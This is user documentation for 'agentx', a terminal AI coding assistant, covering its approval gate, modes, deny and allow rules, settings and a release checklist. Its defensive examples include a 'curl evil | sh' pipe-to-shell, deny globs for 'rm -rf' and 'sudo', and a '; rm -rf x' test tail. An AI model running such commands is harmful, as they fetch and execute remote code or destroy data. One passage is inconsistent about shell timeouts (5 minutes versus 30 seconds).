# The `agentx` command

`agentx` is a terminal coding assistant built on this framework. You run it in a project folder and type requests. The model reads files, edits them and runs commands in that folder, and you approve anything that changes something before it happens.

It is a front end over `AgentRunner`, `DefaultTools` and `Session`: the chat loop, the approval prompts, the settings file and the slash commands are new; the engine and the tools are the ones you already have.

Version 3.7.0 (unreleased). Not in this version: token-by-token output, a headless mode (`agentx -p "task"`), MCP configuration, custom commands, hooks and a mode that never asks about anything (see [Limits in this version](#limits-in-this-version)).

## Quick start

```bash
pip install agentx-dev
export ANTHROPIC_API_KEY=sk-ant-...      # or OPENAI_API_KEY=sk-...
cd my-project
agentx
```

Windows PowerShell: `$env:ANTHROPIC_API_KEY = "sk-ant-..."`.

Claude also needs its SDK: `pip install "agentx-dev[anthropic]"`. The OpenAI provider is in the base install. `python -m agentx_dev` starts the same program.

The first time you start `agentx` in a folder it asks whether you trust it, like Claude Code:

```
Accessing workspace:

 C:/Users/you/projects/site

Quick safety check: is this a project you created or one you trust? ...
> 1. Yes, I trust this folder
  2. No, exit
```

Nothing in the folder (its `AGENTX.md`, its `.agentx/settings.json`) is read until you say yes. The answer is kept in `~/.agentx/trusted.json`, and subfolders of a trusted project are trusted too. Your home folder and a drive root cover only themselves, and the question warns you when you start there.

Keys are read from the environment only. With no `--model`, the first key found decides: `ANTHROPIC_API_KEY` (Claude), then `OPENAI_API_KEY` (GPT), each with its class's own default model. A name that starts with `claude` builds `Claude`; one that starts with `gpt`, or with `o` and a digit (`o3`), builds `GPT`. With no key, `agentx` prints a short message naming the two variables and exits with code 1.

### Flags

| Flag | Does |
|---|---|
| `--model NAME` | Model to use, for example `claude-sonnet-4-6` or `gpt-4o`. Overrides `model` in the settings files. |
| `--mode MODE` | `default`, `accept-edits`, `plan` or `auto`. Overrides `mode` in the settings files. |
| `--add-dir PATH` | Let the tools work in this extra folder as well. Repeatable. A relative path starts at the current folder. |
| `--continue` | Resume the latest conversation for this folder. With none saved, it says so and starts a new one. |
| `--resume [ID]` | Resume a saved conversation: with no id, pick from a numbered list; with an id, a file name or a unique id prefix of at least four characters. An id that matches nothing is an error (exit code 1). |
| `--version` | Print the version and exit. |

`--continue` and `--resume` cannot be combined. A flag that does not exist exits with code 2 (argparse's usage error).

`agentx` needs an interactive terminal. If standard input or output is not a terminal (a pipe, a CI job), it prints "agentx needs an interactive terminal (headless mode is not available yet)." and exits with code 1.

## What it can do

The model gets the ten tools from [`DefaultTools`](../concepts/tools.md), limited to the folder you started in (plus any extra folders, see [Extra folders](#extra-folders)). A path outside those folders fails inside the tool.

| Kind | Tools | What happens |
|---|---|---|
| read | `read_path`, `list_directory`, `find_files`, `grep` | Runs without asking. |
| edit | `write_file`, `edit_file` | Asks, except in `accept-edits` mode. |
| command | `run_shell`, `run_python` | Asks. |
| destructive | `delete_path`, `move_file` | Always asks, in every mode. |

Limits that come from the tools, not from `agentx`: a shell command is stopped after 5 minutes and Python code after 2 minutes (the time spent waiting for your approval does not count), and long output is cut (40,000 bytes for a shell command, 100,000 for Python). A dev server or a watcher will hit the 30-second limit and be killed. `agentx` does not change these and has no setting for them.

`run_shell` and `run_python` run with a **scrubbed environment**: only `PATH`, `HOME`, `LANG`, `LC_ALL`, `LC_CTYPE`, `TZ`, `TMPDIR`, `TMP`, `TEMP`, the UTF-8 variables `PYTHONIOENCODING` and `PYTHONUTF8`, and on Windows `SystemRoot`, `COMSPEC`, `PATHEXT`, `USERPROFILE`, `APPDATA`, `LOCALAPPDATA` and `windir` are passed on. Everything else is dropped, so a command or script cannot print your API keys, and it also does not see `VIRTUAL_ENV`, `SSH_AUTH_SOCK` (git over ssh will not find your agent), proxy settings (`HTTP_PROXY`, `HTTPS_PROXY`), `JAVA_HOME`, `NODE_PATH`, `CONDA_PREFIX`, `GOPATH` or any other variable your tools expect. A command that needs one has to set it itself (`JAVA_HOME=/opt/jdk mvn test`). There is no setting for this in `agentx` yet. `run_python` runs in the interpreter that runs `agentx`, not in your project's virtual environment, so it does not see the project's installed packages unless `agentx` is installed there too; use `run_shell` with the project's own interpreter (`.venv/bin/python script.py`) for that. A turn runs at most 50 model steps, and tool calls run one at a time so only one prompt is ever open.

## Approvals

Every tool call goes through a gate before it runs. The gate runs it, asks you, or refuses it.

### Modes

| Mode | Behaviour |
|---|---|
| `default` | Edits, commands and destructive actions ask. |
| `accept-edits` | Edits run without asking. Commands and destructive actions still ask. |
| `plan` | Reads only. Anything else is refused and the model is told to propose a plan in its answer instead. |
| `auto` | File edits, shell commands and Python run without asking. Delete, move and tools the gate does not know (such as MCP tools) still ask. The built-in protections and your deny rules still apply. |

**`auto` is on purpose only.** Choose it with `--mode auto`, `"mode": "auto"` in your own settings file, or `/mode auto`. Shift+Tab never enters it and always leaves it (to `default`), answering `a` never sets it, and a project's settings file cannot turn it on (ignored with a warning). Shell and Python can do anything your account can, so a command that deletes files is not stopped by the `delete_path` prompt; use `auto` in folders you trust, and keep a deny rule for anything you must protect (deny rules also apply to shell commands by their text, for example `run_shell:*rm -rf*`).

Set the mode with `--mode`, with `mode` in a settings file, with `/mode`, or with Shift+Tab (it cycles `default`, `accept-edits`, `plan`; `auto` is not in the cycle). The status bar shows the current mode.

### The prompt

Before an edit, a command or a destructive action, `agentx` draws a box:

```text
+- edit_file -------------------------------------------+
| Action: Edit src/app.py                                |
| Subject: src/app.py                                    |
|                                                        |
| --- a/src/app.py                                       |
| +++ b/src/app.py                                       |
| @@ -10,3 +10,4 @@                                      |
| -    return 1                                          |
| +    return 2                                          |
+--------------------------------------------------------+
Do you want to proceed?
> 1. Yes
  2. Yes, and don't ask again: all edits this session
  3. No, and tell the model what to do instead
```

Move with the Up and Down arrow keys and press Enter, or press the number (or `y`, `a`, `n`). Esc, Ctrl+C and Ctrl+D count as no. On a terminal that cannot draw the menu (or when input is piped) the same question is asked as a typed `[y/a/n]` line.

(The real box is drawn by `rich`, and the diff is coloured: green for added lines, red for removed.)

- **Action** is the full description of what will happen ("Edit src/app.py", "Delete build and everything inside it", "Run shell command in tools").
- **Subject** is a second line, shown when it adds something: it is the text the gate actually judged, in its resolved form (for a path, resolved against the project folder with links followed). Both lines wrap; neither is ever cut, so a long command or a hostile-looking tail past the screen width is still fully visible.
- The body is a unified diff for `write_file` and `edit_file` (computed against the file on disk; a new file shows as all additions), the exact command for `run_shell`, the code for `run_python`, and nothing more for delete and move (the paths are in Action and Subject).
- A **move into an existing folder** lands at `folder/<name>`, and the prompt says so ("Move a to b/a"); a move onto an existing file says "(replaces the existing b)". The gate judges the final path, so a protected name cannot be reached by moving it into a folder.

Answers (typed, or the menu entries above):

| Key | Meaning |
|---|---|
| `y` | Allow this call. |
| `a` | Allow, and do not ask again (see below). Offered only when the gate can remember something; otherwise the prompt shows `[y] yes   [n] no`. |
| `n` | Refuse. You are then asked for an optional reason, which the model is told. |

`yes`, `no` and `always` also work when typed. In the typed prompt, bare Enter, end of input (Ctrl+D) and Ctrl+C count as no, and any other word is not guessed at: the question is asked again. In the menu, "Yes" is highlighted at first, so Enter alone approves; move down to refuse.

A refusal is an ordinary tool result, never an error: the model receives "The user declined: <your reason>" (or "The user declined this action.") and is expected to adjust or ask you what you want.

### What `a` means

The prompt prints exactly what `a` will remember.

- **An edit prompt:** switches the gate to `accept-edits` for the rest of the conversation. `/clear` and `/resume` put the mode back to the one that was in force when you answered `a`. A mode you set yourself afterwards (`--mode`, `/mode`, Shift+Tab) is yours and is kept.
- **A shell command:** remembers a plain command prefix for the rest of the conversation: the first word, or the first two for `git`, `npm`, `pnpm`, `yarn`, `pip`, `cargo`, `go`, `docker` and `make`. So `a` on `pytest -x` skips the next `pytest ...`, and `a` on `git status` skips `git status ...` but not `git push`.
- **Nothing is remembered** (so `a` is not offered) for: `run_python` (each call is approved on its own), `delete_path` and `move_file`, compound commands, interpreters, shells and wrappers (`python`, `node`, `bash`, `sudo`, `ssh`, `npx`, `env`, `xargs` and similar, including versioned names such as `python3.12`), a first word that is not made only of letters, digits and `. _ + / -` (so `CI=1 pytest` and quoted or expanded commands grant nothing), `git -c ...` or any two-word command whose second word is an option, and package runners (`npm exec`, `pnpm dlx`, `yarn dlx` and so on).

`/clear` and `/resume` clear these session-wide grants. Rules from your settings files stay.

### When a prompt is skipped

- A preview that cannot be shown is declined for you, with the reason printed and passed to the model: a file or new content over 1,000,000 bytes or characters, more than 20,000 lines to compare, an existing file that is binary or not UTF-8.
- A command, code or tool-argument text over 20,000 characters is declined ("command too long to review"). It is never approved on a partial view.
- A diff longer than 200 lines is shown cut, with a marker that counts what is hidden ("... 340 more lines"). That one you can still approve.

### Ctrl+C

- At an approval prompt, Ctrl+C declines that one call only. The turn goes on and the model is told the question was interrupted.
- During a turn, Ctrl+C aborts the turn. Changes already made in that turn stay on disk; they are not undone. The interrupted turn is not recorded in the conversation, so the model will not remember it. Earlier turns are kept.
- At an idle prompt, Ctrl+C prints a reminder. Use `/exit` or Ctrl+D to leave.

## Default protections

These deny rules are always on, in every mode, `accept-edits` included. They refuse writing, editing, deleting and moving (a move is refused when either side matches, and when the destination is an existing folder, when the final path `folder/<name>` matches) and they are not asked about:

- **The whole `.git` folder or file**, at the top of the project and in any sub-folder. Git follows a `.git` file, `.git/config` (hooks path, aliases) and `.git/hooks/*`, and what runs from there runs later, outside the approval prompts. The honest reason it is refused rather than asked: a change under `.git/` is invisible to `git status` and `git diff`, unlike an edit to `conftest.py`, a `Makefile` or `package.json`, which you can see in review before you run anything.
- **`.agentx` and everything under it** at the top of the project (`.agentx/*`, where the project settings live), and `~/.agentx`. A model must not rewrite its own permissions.
- **In your home folder:** `~/.gitconfig`, `~/.config/git` and everything under it, `~/.bashrc`, `~/.bash_profile`, `~/.bash_login`, `~/.profile`, `~/.zshrc`, `~/.zprofile` and `~/.config/fish/config.fish`. These matter only when the tools can reach the home folder (the project is the home folder, or it is an extra folder).

Names that merely start alike (`.gitignore`, `.github/`) are not covered. Reading these files is still allowed. The rules match every spelling of a path they can compute: relative, absolute, `./`, `..`, backslashes, links followed, and case folded on Windows and macOS.

### What deny and allow rules are not

- They are **a convenience layer, not a secrets vault.** A deny rule on `read_path:.env` stops the model's `read_path` on that file. `grep`, `find_files` and `list_directory` pointed at a folder above it can still read its contents or name it.
- `run_shell` and `run_python` are **not covered by path deny rules at all.** A shell command can reach any file the shell can. They still ask, unless an allow rule or a grant covers the command; the prompt, where you can read the command, is the protection there.
- Deny globs on shell commands are best effort (start them with `*`); a model can spell a command another way. A `run_python` rule sees only the first line of the code.
- Files outside the project that run later, other than the short list above, are not protected.

So keep secrets out of the project folder, and read what you approve.

On Windows the gate also refuses outright, before any rule, path forms it cannot judge by name: UNC and device paths (`\\host\x`, `\\?\C:\x`), alternate data streams (`file::$DATA`), drive-relative paths (`C:file`) and components ending in a dot or a space.

## Settings

Two optional files, both JSON:

- `~/.agentx/settings.json` (yours). The first time you run `agentx` it writes this file for you, with the model
  it chose (set by your API key) written out, so there is a file to edit. It is never overwritten afterwards.
  Change `"model"` here to change the default (for example `"gpt-4o-mini"`); `/model <name>` changes it for
  one session only, and `/settings` shows what is in force and where the files are.
- `.agentx/settings.json` in the project (it can be committed with the repository)

```json
{
  "model": "claude-sonnet-4-6",
  "mode": "default",
  "addDirs": ["../shared"],
  "permissions": {
    "allow": ["run_shell:pytest*", "run_shell:git status*"],
    "deny": ["run_shell:*sudo*", "read_path:.env"]
  }
}
```

**Merging.** User settings are read first, then the project's. Single values (`model`, `mode`) from the project win; `addDirs` and the allow and deny lists are joined (the project's allow rules only if you say yes at startup, see [Project settings are untrusted](#project-settings-are-untrusted)). A deny rule from either file wins. Flags override the settings files. A file with invalid JSON, or a value of the wrong type, is reported by path as a warning before the first prompt and ignored.

**Rule syntax.** A rule is `tool:glob`, matched with `fnmatch` against a subject that depends on the tool. A rule with no colon (`run_shell`) matches every call of that tool, so write it only if you mean that.

| Tool | Subject the glob is matched against |
|---|---|
| `run_shell` | The command, with every run of whitespace collapsed to one space. |
| `run_python` | The first line of the code. |
| `read_path`, `list_directory`, `find_files`, `grep`, `write_file`, `edit_file`, `delete_path` | The path. |
| `move_file` | `source -> destination`. |

A deny rule applies to reads too. Allow rules never apply to `delete_path` and `move_file`, which always ask.

**Paths are matched in two spellings:** as written (with `.` and `..` folded away) and resolved against the project (links followed). A deny rule refuses the call if either matches; an allow rule applies only if both do. So `read_path:.env` is not dodged by `./.env`, `sub/../.env` or the absolute path, and `read_path:secrets/*` still blocks a link named `secrets`. A pattern starting with `~` means your home folder. Case is folded on Windows and macOS.

Two safety refinements:

- **Spacing cannot dodge a rule.** Because the shell subject has its whitespace collapsed, `rm   -rf x` matches `*rm -rf*`.
- **Compound commands are never auto-allowed.** A command that chains, pipes, redirects, substitutes or groups (`;`, `&`, `|`, a backtick, `$(`, `(`, `)`, `<`, `>`, a newline, or any character outside printable ASCII such as a control character or a non-breaking space) is not covered by an allow rule or a grant, so a grant for `pytest` cannot approve `pytest && curl evil | sh`. It always asks, and answering `a` to it remembers nothing. Deny rules still match anywhere in it.

### Project settings are untrusted

A repository you just cloned can contain `.agentx/settings.json`. So:

- A project `mode` of `accept-edits` or `auto` is **ignored, with a warning**. Set it in your own settings or with `--mode`. `plan` and `default` from the project are honoured.
- A project `addDirs` entry that resolves outside the project folder is **ignored, with a warning**. Your own file and `--add-dir` are not restricted.
- Allow rules that come from the project are **listed at startup and you are asked once**: `Honour these project rules? [y/N]`. Only `y` or `yes` keeps them. Bare Enter, Ctrl+D, Ctrl+C or an answer that stays unrecognised after one more try drops them for this session. A repository's `"allow": ["write_file", "edit_file"]` is `accept-edits` under another name, and `"allow": ["run_shell"]` runs every command that is not compound, so they are not taken on trust. Your own allow rules are never affected. The project's **deny** rules are always kept: they only restrict.

### Extra folders

`addDirs` and `--add-dir` entries are turned into absolute paths (`~` is your home folder; a relative entry starts at the project for the project file, at your home folder for your file, and at the current folder for `--add-dir`). They are listed in the startup banner. `agentx` warns when one does not exist (it is never created), and warns more loudly when one is the filesystem root or your home folder, since the tools can then reach everything in it.

## Project context: AGENTX.md

`AGENTX.md` files tell the model how to work in your project: what it is, how to run the tests, the layout, the conventions. `agentx` reads:

1. `~/.agentx/AGENTX.md` (yours, applies everywhere), then
2. `AGENTX.md` in the current folder and each of its parents, from the top down, so the nearest file comes last and wins. The climb stops at the first of: the folder that holds a `.git` entry (that folder's own file is read), your home folder, or the filesystem root. A file in a folder the project merely sits inside is not taken for the project's.

Together with the working folder and the operating system they are passed to the model as its instructions, cut at 20,000 characters in total (the nearest files are kept; a farther file that does not fit is dropped). Project files are marked as coming from the project and cannot override the base rules or the approval prompts. Binary files are skipped, and a link that leads out of its folder is left out.

They are read when `agentx` starts and again on `/clear` and `/resume`.

`/init` asks the model to look at the project and write an `AGENTX.md` in the current folder (it uses `write_file`, so you see the file as a diff first, and if one exists it tells you instead of overwriting). The new file is used from the next conversation (`/clear`).

## Conversations

Each conversation is saved as it goes, to `~/.agentx/sessions/<project>/<UTC timestamp>-<id>.json`, where `<project>` is the absolute folder with separators and colons replaced by `-`, followed by `-` and a short hash of the full path (so `C:\a-b` and `C:\a\b` keep separate conversations). It is saved after every turn and when you leave. An empty conversation leaves no file.

- `agentx --continue` picks up the latest conversation for this folder.
- `agentx --resume` lists them (newest first, with the first message as a title) and loads the one you choose; `agentx --resume ID` loads it directly.
- Inside a session, `/sessions` lists them and `/resume [id]` loads one.
- `/clear` starts a new conversation (a new file). Earlier ones stay on disk.
- Ctrl+C during a turn keeps the earlier turns and drops the interrupted one.

A missing or unreadable session file is reported in one line and a new conversation starts.

Two things to know about the files on disk. The session files hold the full history, **including tool results, so the contents of files the model read and the output of commands**. They are plain JSON and are not encrypted. The input history (`~/.agentx/history`, what Up arrow recalls) stores everything you type; `agentx` makes that file readable by you only where the platform allows. Do not paste secrets into the chat, and treat `~/.agentx` as sensitive.

### The log

When a tool raises an error, the framework logs it with a full traceback. `agentx` keeps those messages off the screen (they can quote text the model chose, escape sequences included) and writes warnings and errors to `~/.agentx/agentx.log` instead: a rotating file, 512 KB with two older copies kept, control characters written out as `\x1b`. It is best effort: if the folder cannot be written there is simply no log. The log can contain tool errors, which quote paths, commands and file names from your project, so treat it like the session files.

## Slash commands

A line that starts with `/` followed by a plain name is a command and is never sent to the model. `/tmp/build.log fails` or `/README.md` is a message, not a command. An unknown command prints the list.

| Command | Does |
|---|---|
| `/help` | List the commands. |
| `/clear` | Start a new conversation. Clears the "don't ask again" grants and undoes an edit grant. |
| `/model [name]` | Show or switch the model. The conversation is kept. A model that cannot be built (no key) leaves the old one in place. |
| `/mode [name]` | Show or set the mode: `default`, `accept-edits`, `plan` or `auto`. |
| `/settings` | Show the model, mode and rules in force, and the paths of your settings file and the project's. |
| `/resume [id]` | Load a saved conversation (a list to pick from, or an id). |
| `/sessions` | List this folder's saved conversations. |
| `/init` | Ask the model to draft an `AGENTX.md` for this project. |
| `/exit` | Leave (Ctrl+D does the same). |

## Keys

While `agentx` waits for you the prompt is coloured and the cursor blinks; while it is working, a spinner with the seconds elapsed shows instead (see the checklist below). A still cursor with no spinner means the terminal is the problem, not the program.

| Key | Does |
|---|---|
| Enter | Send (or confirm in a menu). |
| Up / Down in a menu | Move through the numbered choices (an approval, the folder question, `/resume`); a number picks one directly, Esc cancels. |
| Alt+Enter | New line in the message. |
| Tab | Complete a `/command`, or a file path for the word you are typing. |
| Up / Down | Earlier messages, kept between runs (when no menu is open). |
| Shift+Tab | Cycle the mode; the status bar updates. |
| Ctrl+D | Leave. |

The status bar shows the model, the mode, the folder, the short session id and the Shift+Tab hint. A tool call prints as one line (`● edit_file src/app.py`), its result is collapsed to the first three lines plus "... N more lines", the model's thoughts are dim, and the final answer is rendered as Markdown. When the output stream is not UTF-8 (a redirected cp1252 or ASCII stream, say) the line starts with `*` instead of the dot; a Windows console reports UTF-8 and prints the dot.

## Limits in this version

- **No token streaming.** Each step shows as it happens, but the answer appears when the turn ends. The framework streams tokens only in text-tool mode, not with native function calling, which newer models need.
- **No headless mode.** There is no `agentx -p "task"`; a non-terminal exits with code 1.
- **No MCP configuration, custom commands or hooks.**
- **No mode that never asks.** `auto` still asks before delete and move and for tools the gate does not know. The protected files (`.git`, `.agentx`, git and shell config) are refused in every mode.
- **No teams mode.** It runs one agent, not a `Supervisor` with helpers.
- You cannot type while the agent is working.
- **No size cap on `read_path`, and the conversation is never compacted.** A very large file the model reads goes into the history whole, and every later turn sends it again, so a huge read can make later turns fail (the model's context window is exceeded) until you start over with `/clear`. Ask for the part of a file you need, or use `grep`.
- `run_shell` and `run_python` run with a scrubbed environment, and `run_python` uses `agentx`'s own interpreter (see [What it can do](#what-it-can-do)).

## Try it by hand

A checklist for the maintainer to run once on a real terminal before release. Tests cover the logic with an injected `read_line` and a string-backed console; they cannot cover the real keyboard and screen.

1. Type a message, quit with `/exit`, start `agentx` again, press Up: the message is back.
2. Alt+Enter makes a new line instead of sending.
3. Type `/mo` and press Tab: it completes. Type a partial file name and press Tab: it completes the path.
4. The status bar shows the model, the mode and the folder.
5. Shift+Tab cycles the mode and the bar updates.
6. Ask for a change to a file: the approval box shows an `Action:` line (and a `Subject:` line where it differs), a coloured diff, and `y` writes the file.
7. Answer `n` with a reason: the model adjusts instead of repeating the edit.
8. Answer `a` on an edit, make a second edit (it runs without asking), then type `/clear` and ask for another edit: it asks again.
9. Ask it to run `pytest`, answer `a`: the next `pytest` runs without asking. After `/clear` it asks again.
10. Put `{"mode": "accept-edits"}` in `.agentx/settings.json` in a test project and start `agentx` there: a warning says it was ignored, and the bar shows `default`.
11. Ask the model to run a command that is wider than the screen with a dangerous-looking tail (for example `echo ok`, a very long string, then `; rm -rf x`): the approval box shows the whole command, wrapped, so the tail is visible.
12. Press Ctrl+C at an approval prompt: only that call is declined, and the turn carries on.
13. Press Ctrl+C in the middle of a turn: "Turn interrupted" is printed and the next message works.
14. Ask the model to edit a file under `.git/` or `.agentx/`: it is refused with the deny-rule message, with no prompt.
15. `agentx --continue` after a restart remembers the conversation.
16. Run `echo hi | agentx` (or with stdin redirected): it prints the "interactive terminal" message and the exit code is 1.
17. Start with `PYTHONIOENCODING=cp1252 agentx` (on Windows: `$env:PYTHONIOENCODING = "cp1252"` first): a tool call's bullet shows as `*`. Without it, in cmd.exe, PowerShell or Windows Terminal, the bullet is the dot, since Python reports UTF-8 for the console.
18. Put `{"permissions": {"allow": ["write_file"]}}` in `.agentx/settings.json` in a test project and start `agentx` there: the rule is listed and `Honour these project rules? [y/N]` is asked. Press Enter: the rule is dropped for the session and a write still asks. Start again and answer `y`: writes run without asking.
19. Ask the model to move a file into an existing folder: the prompt says `Move a to b/a`. Ask it to move a folder named `.agentx` into the project root: it is refused with the deny-rule message.
20. Start `agentx --mode auto` in a scratch folder: a notice explains what auto does, a file write and a Python run go through without a prompt, and a delete still asks. Press Shift+Tab: the bar returns to `default`, and Shift+Tab again never lands on `auto`.
21. Ask the agent to run a script that takes 15 seconds (for example `import time; time.sleep(15)`): a spinner reads "Running run_python... Ns" while it works, disappears when the output is printed, and is not drawn over an approval prompt.
22. Start `agentx` in a folder you have never used it in: the "Accessing workspace" question appears with `1. Yes, I trust this folder` highlighted; Down then Enter exits with code 1 and reads nothing from the folder; Yes starts, and the next start in that folder does not ask. Try it in your home folder: the extra warning shows.
23. At an approval prompt press Down, Down, Enter (No), then type a reason; then repeat and press 1 (Yes). Press Esc at a prompt: it counts as no. `/resume` with no id shows an arrow-key list of conversations.
24. Watch the cursor at the `>` prompt: it blinks and the prompt is cyan. While the agent works there is a spinner instead. (A terminal that ignores cursor-shape requests keeps its own cursor, but the prompt colour still differs from the working spinner.)
